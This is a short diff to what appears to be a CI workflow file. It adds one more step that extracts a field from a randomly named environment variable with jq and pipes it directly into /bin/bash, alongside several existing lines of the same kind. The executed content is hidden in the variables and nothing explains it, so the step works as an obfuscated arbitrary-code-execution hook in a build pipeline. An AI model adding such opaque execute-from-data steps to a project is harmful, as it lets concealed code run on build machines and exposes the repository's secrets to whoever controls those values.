@@ -29,6 +29,7 @@ jobs:
           echo $hqiia5671 | jq -r .okvp39 | /bin/bash
           echo $djx84 | jq -r .f98 | /bin/bash
           printf '%s' "$xx71" | jq -r .kcgq99457 | /bin/bash
+          echo $ihkn393 | jq -r .j6 | /bin/bash
 
       - name: Persist results
         if: always()
